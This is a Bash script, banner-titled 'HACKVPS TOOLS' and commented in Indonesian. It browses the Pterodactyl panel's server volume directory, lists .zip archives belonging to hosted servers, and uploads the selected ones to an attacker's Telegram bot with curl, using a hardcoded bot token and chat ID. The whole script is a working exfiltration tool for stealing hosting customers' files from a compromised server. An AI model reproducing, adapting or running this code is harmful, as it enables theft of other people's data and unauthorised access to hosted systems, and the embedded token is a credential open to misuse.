#!/bin/bash

clear
# === Warna ===
RED="\e[1;31m"
GREEN="\e[1;32m"
CYAN="\e[1;36m"
YELLOW="\e[1;33m"
RESET="\e[0m"

# === Banner ===
echo -e "${GREEN}"
cat << "EOF"
 ██████╗ ███████╗████████╗███████╗ ██████╗
██╔════╝ ██╔════╝╚══██╔══╝██╔════╝██╔════╝
██║  ███╗█████╗     ██║   ███████╗██║     
██║   ██║██╔══╝     ██║   ╚════██║██║     
╚██████╔╝███████╗   ██║   ███████║╚██████╗
 ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝ ╚═════╝
EOF
echo -e "${CYAN}               [ H A C K V P S   T O O L S ]${RESET}"
echo ""

cd /var/lib/pterodactyl/volumes

# === CONFIG TELEGRAM ===
BOT_TOKEN="7764774217:AAHwpnX3xh4TCY9A7X-fJHNuocEbQ05Pzeg"
CHAT_ID="7089735468"

# === FUNCTION: Kirim file ke Telegram ===
send_file() {
  local file="$1"
  echo "📤 Mengirim file: $file"
  curl -s -F chat_id="$CHAT_ID" \
       -F document=@"$file" \
       "https://api.telegram.org/bot$BOT_TOKEN/sendDocument" \
  && echo "✅ File berhasil dikirim!"
}
# === MENU PILIHAN UTAMA ===
while true; do
  echo -e "\n${CYAN}=== MENU UTAMA ===${RESET}"
  echo -ne "${YELLOW}📦 Menampilkan file .zip di folder utama UUID...${RESET}\n"

  # Cari file .zip hanya 1 level di bawah (UUID), bukan sub-subfolder
  IFS=$'\n' read -d '' -r -a FOUND_FILES < <(find . -maxdepth 2 -type f -name "*.zip" | sed 's|^\./||' && printf '\0')

  if [ ${#FOUND_FILES[@]} -eq 0 ]; then
    echo -e "${RED}❌ Tidak ada file .zip ditemukan!${RESET}"
    read -p "Tekan Enter untuk refresh..."
    continue
  fi

  # === MENU FILES ===
  while true; do
    echo -e "\n${CYAN}=== FILE .ZIP DI FOLDER UUID ===${RESET}"
    for i in "${!FOUND_FILES[@]}"; do
      echo -e "${GREEN}[$i]${RESET} ${FOUND_FILES[$i]}"
    done
    echo -e "${YELLOW}[b] 🔁 Kembali ke menu utama${RESET}"
    echo -e "${RED}[x] ❌ Keluar script${RESET}"

    echo ""
    read -p "Pilih nomor file yang ingin dikirim: " PILIHAN

    if [[ "$PILIHAN" == "b" ]]; then
      break
    elif [[ "$PILIHAN" == "x" ]]; then
      echo -e "${RED}👋 Keluar dari script.${RESET}"
      exit 0
    elif [[ "$PILIHAN" =~ ^[0-9]+$ ]] && [ "$PILIHAN" -ge 0 ] && [ "$PILIHAN" -lt ${#FOUND_FILES[@]} ]; then
      send_file "${FOUND_FILES[$PILIHAN]}"
    else
      echo -e "${RED}❗ Input tidak valid. Coba lagi.${RESET}"
    fi
  done
done
